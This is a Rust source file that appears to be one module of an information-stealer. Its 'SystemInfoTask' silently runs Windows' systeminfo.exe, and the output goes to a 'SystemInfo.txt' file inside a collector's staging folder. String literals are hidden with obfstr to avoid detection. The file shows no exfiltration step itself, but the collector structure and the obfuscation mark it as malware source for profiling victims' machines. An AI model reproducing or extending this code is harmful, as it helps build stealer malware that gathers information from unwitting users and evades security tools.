use crate::alloc::borrow::ToOwned;
use alloc::string::String;
use collector::Collector;
use filesystem::path::Path;
use filesystem::{FileSystem, WriteTo};
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::process;

pub(super) struct SystemInfoTask;

impl<C: Collector, F: FileSystem> Task<C, F> for SystemInfoTask {
    parent_name!("SystemInfo.txt");

    fn run(&self, parent: &Path, filesystem: &F, _: &C) {
        let system = Path::system();

        let Ok(res) = (unsafe { process::run_file(&(system / s!("systeminfo.exe"))) }) else {
            return;
        };

        let res = String::from_utf8_lossy(&res);
        let res = res.trim();

        let _ = res.write_to(filesystem, parent);
    }
}
